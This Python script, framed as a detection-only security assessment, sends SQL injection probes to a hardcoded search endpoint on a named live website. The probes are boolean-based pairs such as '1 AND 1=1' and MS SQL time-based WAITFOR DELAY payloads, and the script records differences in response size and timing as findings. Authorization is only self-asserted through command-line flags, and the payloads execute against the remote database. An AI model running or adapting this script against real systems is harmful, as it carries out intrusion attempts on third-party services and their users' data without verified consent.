#!/usr/bin/env python3
"""
SQL Injection detection — non-destructive, read-only probes.

This script ONLY detects whether SQLi is possible.
It does NOT extract data, enumerate schema, or modify the database.
"""

from __future__ import annotations

import argparse
import os
import statistics
import time
from dataclasses import dataclass
from typing import Any

import requests


BASE_SEARCH = "https://www.halipratik.com/supplier/Design/Android/SearchCustomer.aspx"
APP_VERSION = "1.10.32"


# Boolean-based: same logical query, different boolean outcome.
# If results differ between TRUE and FALSE conditions, SQLi exists.
BOOLEAN_PAIRS = [
    {
        "label": "numeric_and",
        "true":  "1 AND 1=1",
        "false": "1 AND 1=2",
    },
    {
        "label": "string_and",
        "true":  "1' AND '1'='1",
        "false": "1' AND '1'='2",
    },
    {
        "label": "numeric_or",
        "true":  "1 OR 1=1",
        "false": "1 OR 1=2",
    },
]

# Time-based: SQL Server WAITFOR. If response time increases significantly,
# the database is executing our payload.
TIME_BASED_PAYLOADS = [
    {
        "label": "mssql_waitfor_3s",
        "payload": "1; WAITFOR DELAY '0:0:3'--",
        "expected_delay_ms": 3000,
    },
    {
        "label": "mssql_waitfor_inline",
        "payload": "1' WAITFOR DELAY '0:0:3'--",
        "expected_delay_ms": 3000,
    },
]


@dataclass
class Finding:
    title: str
    severity: str
    evidence: dict[str, Any]


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--userid", required=True)
    parser.add_argument("--mno", type=int, default=1)
    parser.add_argument("--proxy", default=os.getenv("HTTPS_PROXY"))
    parser.add_argument("--samples", type=int, default=5,
                        help="Samples per probe (statistical significance)")
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument("--ack-authorized", action="store_true")
    parser.add_argument("--detection-only", action="store_true",
                        help="Required acknowledgment that this is detection only")
    args = parser.parse_args()

    if not args.ack_authorized:
        parser.error("Refusing to run without --ack-authorized.")
    if not args.detection_only:
        parser.error(
            "This script is detection-only. Confirm with --detection-only.\n"
            "Do NOT modify it to extract data; that crosses legal boundaries."
        )
    return args


def make_session(proxy):
    session = requests.Session()
    session.headers.update({"User-Agent": "FlubbleSecurityAssessment/1.0"})
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})
    return session


def make_request(session, value, userid, timeout):
    """Single SearchCustomer request, returns (status, body, elapsed_ms)."""
    start = time.time()
    try:
        r = session.get(
            BASE_SEARCH,
            params={"type": "mno", "value": value, "userid": userid, "ver": APP_VERSION},
            timeout=timeout,
            allow_redirects=False,
        )
        elapsed = (time.time() - start) * 1000
        return r.status_code, r.text, elapsed, len(r.content)
    except requests.Timeout:
        elapsed = (time.time() - start) * 1000
        return None, "TIMEOUT", elapsed, 0


def boolean_based_probe(session, userid, samples, timeout, findings):
    """
    For each boolean pair, send TRUE and FALSE conditions multiple times.
    If the response sizes/contents consistently differ, SQLi is possible.
    """
    print("\n[BOOLEAN-BASED PROBES]")
    results = {}

    # Baseline: known-good single integer
    print("  baseline...")
    baseline_sizes = []
    for _ in range(samples):
        _, _, _, size = make_request(session, "1", userid, timeout)
        baseline_sizes.append(size)
        time.sleep(0.5)
    baseline_avg = statistics.mean(baseline_sizes)
    print(f"  baseline avg size: {baseline_avg:.0f} bytes")

    for pair in BOOLEAN_PAIRS:
        label = pair["label"]
        print(f"\n  {label}:")
        true_sizes, false_sizes = [], []
        true_status, false_status = [], []

        for _ in range(samples):
            s, _, _, size = make_request(session, pair["true"], userid, timeout)
            true_sizes.append(size)
            true_status.append(s)
            time.sleep(0.5)

            s, _, _, size = make_request(session, pair["false"], userid, timeout)
            false_sizes.append(size)
            false_status.append(s)
            time.sleep(0.5)

        true_avg = statistics.mean(true_sizes)
        false_avg = statistics.mean(false_sizes)
        delta = abs(true_avg - false_avg)

        print(f"    TRUE  ({pair['true']!r}):  avg={true_avg:.0f}b, statuses={set(true_status)}")
        print(f"    FALSE ({pair['false']!r}): avg={false_avg:.0f}b, statuses={set(false_status)}")
        print(f"    delta: {delta:.0f}b")

        results[label] = {
            "true_payload": pair["true"],
            "false_payload": pair["false"],
            "true_avg_bytes": round(true_avg, 1),
            "false_avg_bytes": round(false_avg, 1),
            "delta_bytes": round(delta, 1),
            "true_statuses": list(set(true_status)),
            "false_statuses": list(set(false_status)),
        }

        # Significant size delta = likely SQLi
        if delta > 50:
            findings.append(Finding(
                f"Boolean-based SQLi possible ({label})",
                "critical",
                {"delta_bytes": round(delta, 1), "samples": samples}
            ))
        # Different status codes also indicate processing
        if set(true_status) != set(false_status):
            findings.append(Finding(
                f"Boolean condition affects response status ({label})",
                "high",
                {"true_status": list(set(true_status)),
                 "false_status": list(set(false_status))}
            ))

    return results


def time_based_probe(session, userid, samples, timeout, findings):
    """
    Time-based: send a payload that should cause a delay if executed.
    Compare against baseline timing.
    """
    print("\n[TIME-BASED PROBES]")
    results = {}

    # Baseline timing
    print("  baseline timing...")
    baseline_times = []
    for _ in range(samples):
        _, _, elapsed, _ = make_request(session, "1", userid, timeout)
        baseline_times.append(elapsed)
        time.sleep(0.5)
    baseline_avg = statistics.mean(baseline_times)
    baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
    print(f"  baseline: {baseline_avg:.0f}ms (±{baseline_stdev:.0f}ms)")

    for probe in TIME_BASED_PAYLOADS:
        label = probe["label"]
        print(f"\n  {label}:")
        times = []
        for _ in range(samples):
            _, _, elapsed, _ = make_request(session, probe["payload"], userid, timeout)
            times.append(elapsed)
            print(f"    {elapsed:.0f}ms")
            time.sleep(1.0)

        avg = statistics.mean(times)
        delta = avg - baseline_avg

        results[label] = {
            "payload": probe["payload"],
            "expected_delay_ms": probe["expected_delay_ms"],
            "baseline_avg_ms": round(baseline_avg, 0),
            "probe_avg_ms": round(avg, 0),
            "delta_ms": round(delta, 0),
        }

        # If delay matches expected, time-based SQLi confirmed
        if delta > probe["expected_delay_ms"] * 0.7:
            findings.append(Finding(
                f"Time-based SQLi confirmed ({label})",
                "critical",
                {"baseline_ms": round(baseline_avg, 0),
                 "probe_avg_ms": round(avg, 0),
                 "expected_delay_ms": probe["expected_delay_ms"]}
            ))
        elif delta > 500:
            findings.append(Finding(
                f"Suspicious timing delta ({label})",
                "high",
                {"delta_ms": round(delta, 0)}
            ))

    return results


def main():
    args = parse_args()
    session = make_session(args.proxy)
    findings: list[Finding] = []

    print("=" * 60)
    print("SQL Injection Detection — read-only, non-destructive")
    print("=" * 60)
    print(f"Target: {BASE_SEARCH}")
    print(f"Samples per probe: {args.samples}")
    print()

    bool_results = boolean_based_probe(
        session, args.userid, args.samples, args.timeout, findings)

    time_results = time_based_probe(
        session, args.userid, args.samples, args.timeout, findings)

    print("\n" + "=" * 60)
    print(f"FINDINGS: {len(findings)}")
    print("=" * 60)
    if not findings:
        print("No clear SQLi indicators detected.")
        print("(This does not mean SQLi is impossible — only that these probes didn't trigger.)")
    else:
        for f in findings:
            print(f"\n[{f.severity.upper()}] {f.title}")
            for k, v in f.evidence.items():
                print(f"  {k}: {v}")

    # Save results
    import json
    with open("sqli_detection_evidence.json", "w") as fp:
        json.dump({
            "boolean_probes": bool_results,
            "time_probes": time_results,
            "findings": [
                {"title": f.title, "severity": f.severity, "evidence": f.evidence}
                for f in findings
            ],
        }, fp, indent=2, ensure_ascii=False)
    print("\nSaved: sqli_detection_evidence.json")


if __name__ == "__main__":
    main()